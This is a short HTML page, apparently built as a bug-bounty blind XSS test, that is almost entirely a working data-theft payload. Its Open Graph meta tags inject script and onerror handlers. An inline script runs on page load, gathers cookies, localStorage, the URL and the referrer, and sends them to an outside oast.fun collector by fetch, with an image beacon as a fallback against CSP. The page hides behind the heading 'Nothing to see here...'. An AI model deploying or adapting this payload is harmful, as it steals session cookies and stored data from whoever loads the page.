<!DOCTYPE html>
<html>
<head>
    <!-- 1. Попытка кражи данных через Open Graph (для превью ссылок) -->
    <meta property="og:title" content="<script src='https://oast.fun'></script>">
    <meta property="og:description" content="Check this out! <img src=x onerror=fetch('https://oast.fun)>">
    
    <title>Bug Bounty Research</title>
</head>
<body>
    <script>
        // 2. Автоматическая отправка данных при открытии страницы (Blind XSS)
        const collector = "https://jcnxiqrzotvqzopexoxwrf8twt5d92xby.oast.fun";
        
        const data = {
            url: window.location.href,
            referrer: document.referrer,
            cookies: document.cookie,
            localStorage: JSON.stringify(localStorage),
            userAgent: navigator.userAgent
        };

        // Отправка через fetch
        fetch(collector + "/exfil", {
            method: "POST",
            mode: "no-cors",
            body: JSON.stringify(data)
        });

        // 3. Запасной вариант через Image (если fetch заблокирован CSP)
        new Image().src = collector + "/log?info=" + btoa(JSON.stringify(data));
    </script>
    
    <h1>Nothing to see here...</h1>
</body>
</html>
